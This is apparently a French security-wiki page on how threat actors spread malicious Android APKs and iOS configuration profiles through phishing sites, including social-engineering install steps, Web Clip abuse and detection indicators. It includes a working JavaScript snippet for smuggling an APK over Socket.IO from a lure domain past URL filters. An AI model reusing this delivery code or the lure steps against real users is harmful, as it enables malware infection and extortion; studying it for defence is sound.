# Distribution mobile par phishing et applications malveillantes (Android et iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Cette page couvre les techniques utilisées par les threat actors pour distribuer des **APK Android malveillants** et des **profils de configuration mobiles iOS** via le phishing (SEO, ingénierie sociale, fausses boutiques, applications de rencontre, etc.).
> Le contenu est adapté de la campagne SarangTrap révélée par Zimperium zLabs (2025) et d'autres recherches publiques.<sup>[[1]](#references)</sup>

## Flux d'attaque

1. **Infrastructure SEO/Phishing**
* Enregistrer des dizaines de domaines similaires (rencontres, partage cloud, service automobile…).
– Utiliser des mots-clés en langue locale et des emojis dans l'élément `<title>` pour être mieux classé dans Google.
– Héberger les instructions d'installation Android (`.apk`) et iOS sur la même landing page.
2. **Téléchargement de première étape**
* Android : lien direct vers un APK *unsigned* ou provenant d'une « third-party store ».
* iOS : lien `itms-services://` ou HTTPS simple vers un profil **mobileconfig** malveillant (voir ci-dessous).
3. **Comportement Android après l'installation**
* L'exécution contrôlée par le C2, l'abus des permissions, les contournements de droppers, la collecte en arrière-plan et autres comportements de malware post-installation sont décrits dans la page dédiée Android Malware Post-Exploitation ci-dessous.
4. **Technique de distribution iOS**
* Un seul **profil de configuration mobile** peut demander `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration`, etc., afin d'inscrire l'appareil dans une supervision de type « MDM ».
* Instructions d'ingénierie sociale :
1. Ouvrir Réglages ➜ *Profil téléchargé*.
2. Appuyer trois fois sur *Installer* (captures d'écran sur la page de phishing).
3. Faire confiance au profil unsigned ➜ l'attaquant obtient les droits *Contacts* et *Photo* sans examen par l'App Store.
5. **Payload iOS Web Clip (icône d'application de phishing)**
* Les payloads `com.apple.webClip.managed` peuvent **épingler une URL de phishing sur l'écran d'accueil** avec une icône/étiquette personnalisée.
* Les Web Clips peuvent s'exécuter en **plein écran** (masquant l'interface du navigateur) et être marqués comme **non supprimables**, obligeant la victime à supprimer le profil pour retirer l'icône.<sup>[[3]](#references)</sup>
6. **Couche réseau**
* HTTP simple, souvent sur le port 80 avec un en-tête HOST tel que `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (aucun TLS → facilement détectable).

## Android Malware Post-Exploitation

Pour les techniques Android malware post-installation telles que le C2, l'abus d'Accessibility, les overlays, l'automatisation ATS, le chargement de DEX par étapes, les SMS premium et la persistance, voir la page Android Malware Post-Exploitation dédiée ci-dessous :

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## APK Smuggling basé sur Socket.IO/WebSocket + fausses pages Google Play

Les attaquants remplacent de plus en plus les liens APK statiques par un canal Socket.IO/WebSocket intégré à des leurres ressemblant à Google Play. Cela dissimule l'URL du payload, contourne les filtres d'URL/extensions et conserve une UX d'installation réaliste.<sup>[[2]](#references)[[4]](#references)</sup>

Flux client typique observé sur le terrain :

<details>
<summary>Faux téléchargeur Play basé sur Socket.IO (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Pourquoi il contourne les contrôles simples :
- Aucune URL APK statique n’est exposée ; le payload est reconstruit en mémoire à partir de trames WebSocket.
- Les filtres d’URL/MIME/extension qui bloquent les réponses .apk directes peuvent ne pas détecter les données binaires transportées via WebSockets/Socket.IO.
- Les crawlers et les URL sandboxes qui n’exécutent pas les WebSockets ne récupéreront pas le payload.

Voir également le tradecraft et les outils WebSocket :

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References

- [1] [Le côté obscur de la romance : campagne d’extorsion SarangTrap](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Paramètres du payload Web Clips pour les appareils Apple](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [Banker Trojan ciblant les utilisateurs Android indonésiens et vietnamiens](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
{{#include ../../banners/hacktricks-training.md}}
